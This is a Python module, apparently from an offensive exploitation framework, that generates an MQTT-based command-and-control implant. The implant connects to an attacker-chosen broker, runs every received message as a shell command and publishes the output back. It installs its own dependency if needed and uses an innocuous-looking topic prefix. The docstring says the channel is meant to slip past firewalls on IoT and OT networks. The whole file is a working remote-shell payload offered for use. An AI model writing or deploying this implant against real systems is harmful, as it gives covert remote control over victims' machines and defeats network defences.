"""MQTT Covert Channel Payload.

Usa um broker MQTT como canal de C2 bidirecional.
Bypassa firewalls que só bloqueiam TCP direto — MQTT (porta 1883/8883) é
comumente permitido em redes IoT/OT.

Protocolo:
  Publisher (C2) → topic: <PREFIX>/cmd/<SESSION_ID>  → comando a executar
  Subscriber (implant) → topic: <PREFIX>/out/<SESSION_ID> → saída do comando
"""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "MQTT Reverse Channel",
        "description": "MQTT broker as covert C2 channel — bidirectional command execution.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }

    options = {
        "BROKER": {"description": "MQTT broker IP/domain", "required": True, "default": "", "value": ""},
        "PORT":   {"description": "MQTT broker port", "required": False, "default": "1883", "value": "1883"},
        "PREFIX": {"description": "MQTT topic prefix", "required": False, "default": "sys/update", "value": "sys/update"},
        "SESSION": {"description": "Session ID (random if empty)", "required": False, "default": "", "value": ""},
        "TLS":    {"description": "Use TLS (port 8883)", "required": False, "default": "false", "value": "false"},
    }

    def generate(self) -> bytes:
        import os
        broker  = self.options["BROKER"]["value"]
        port    = self.options["PORT"]["value"]
        prefix  = self.options["PREFIX"]["value"]
        session = self.options["SESSION"]["value"] or os.urandom(4).hex()
        tls     = self.options["TLS"]["value"].lower() == "true"

        stager = f"""#!/usr/bin/env python3
# MQTT C2 implant — session: {session}
import subprocess,os,sys
try:import paho.mqtt.client as mqtt
except ImportError:
    import subprocess;subprocess.run([sys.executable,'-m','pip','install','paho-mqtt','-q'])
    import paho.mqtt.client as mqtt

SESSION="{session}"
PREFIX="{prefix}"

def on_connect(c,u,f,rc):
    c.subscribe(PREFIX+"/cmd/"+SESSION)

def on_message(c,u,msg):
    try:
        cmd=msg.payload.decode().strip()
        if cmd=="exit":c.disconnect();sys.exit()
        out=subprocess.check_output(cmd,shell=True,stderr=subprocess.STDOUT,timeout=30)
    except Exception as e:out=str(e).encode()
    c.publish(PREFIX+"/out/"+SESSION,out)

c=mqtt.Client()
c.on_connect=on_connect
c.on_message=on_message
{"c.tls_set()" if tls else ""}
c.connect("{broker}",{port},60)
c.loop_forever()
"""
        return stager.encode()
